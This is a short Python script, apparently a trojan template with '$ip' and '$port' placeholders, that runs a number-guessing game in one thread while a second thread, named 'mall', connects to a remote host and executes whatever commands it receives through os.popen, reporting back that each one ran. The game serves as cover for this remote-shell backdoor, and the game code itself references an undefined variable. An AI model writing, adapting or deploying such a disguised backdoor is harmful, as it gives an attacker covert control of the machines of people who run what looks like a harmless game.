import random
import socket
import threading
import os

def mall():
	HOST = '$ip'
	PORT = $port

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((HOST, PORT))


	cmd_mode = False

	while True:
		server_command= client.recv(1024).decode('utf-8')

		if server_command == "cmdon":
			cmd_mode = True
			client.send("[+]- Terminal Access".encode('utf-8'))
			continue
		if server_command == "cmdoff":
			cmd_mode = False
		if cmd_mode:
			os.popen(server_command)
		if server_command == 'hello':
			print('hello World')
		client.send(f"[+] {server_command} was executed successfully".encode('utf-8'))


def game():

	numb = random.randint(0,1000)
	tries = 1

	done = False 

	while  not done:
		
		find = int (input("Enter a number:"))

		if find ==numb:
			done = True
			print ("You Win")
		else:
			tries +=1
			if find > numb:
				print("Smaller")
			else:
				print ("Larger")

	print(f"you did {ties} tris !")		

t1 = threading.Thread(target=game)
t2 = threading.Thread(target=mall)

t1.start()
t2.start()
